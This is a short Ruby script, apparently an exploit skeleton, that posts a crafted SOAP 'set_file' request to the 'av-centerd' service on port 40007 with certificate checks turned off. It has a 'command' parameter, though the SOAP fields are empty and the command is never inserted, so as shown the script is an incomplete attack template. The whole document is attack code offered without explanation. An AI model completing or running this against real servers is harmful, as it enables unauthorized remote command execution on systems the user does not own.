#! /usr/bin/env ruby

require 'net/http'
require 'net/https'
require 'uri'

target = ''
command = ''

def soapRequest(target, command)
	soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	soap += "<soap:Envelope xmlns:soap=\"http:\/\/schemas.xmlsoap.org/soap/envelope/\"\r\n"
	soap += "xmlns:soapenc=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding/\" xmlns:xsd=\"http:\/\/www.w3.org\/2001\/XMLSchema\"\r\n"
	soap += "xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\"\r\n"
	soap += "soap:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\">\r\n"
	soap += "<soap:Body>\r\n"
	soap += "<set_file xmlns=\"AV\/CC\/Util\">\r\n"
	soap += "<c-gensym3 xsi:type=\"xsd:string\"></c-gensym3>\r\n"
	soap += "<c-gensym5 xsi:type=\"xsd:string\"></c-gensym5>\r\n"
	soap += "<c-gensym7 xsi:type=\"xsd:string\"></c-gensym7>\r\n"
	soap += "<c-gensym9 xsi:type=\"xsd:string\"></c-gensym9>\r\n"
	soap += "<c-gensym11 xsi:type=\"xsd:string\"></c-gensym11>\r\n"
	soap += "<c-gensym13 xsi:type=\"xsd:string\"></c-gensym13>\r\n"
	soap += "<c-gensym15 xsi:type=\"xsd:string\"></c-gensym15>\r\n"
	soap += "<c-gensym17 xsi:type=\"xsd:string\"></c-gensym17>\r\n"
	soap += "<c-gensym19 xsi:type=\"xsd:string\"></c-gensym19>\r\n"
	soap += "<c-gensym21 xsi:type=\"xsd:string\"></c-gensym21>\r\n"
	soap += "</set_file>\r\n"
	soap += "</soap:Body>\r\n"
	soap += "</soap:Envelope>\r\n"

	return soap
end

def main(target, command)
	uri = URI.parse("https://#{target}")
	http = Net::HTTP.new(uri.host, 40007)
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE

	req = Net::HTTP::Post.new("/av-centerd")
	req.initialize_http_header({
		'Content-Type'	=>	'text/xml; charset=UTF-8',
		'SOAPAction'		=>	'"AV/CC/Util#set_file"'
	})
	req.body = soapRequest(target, command)

	res = http.request(req)
end

main(target, command)
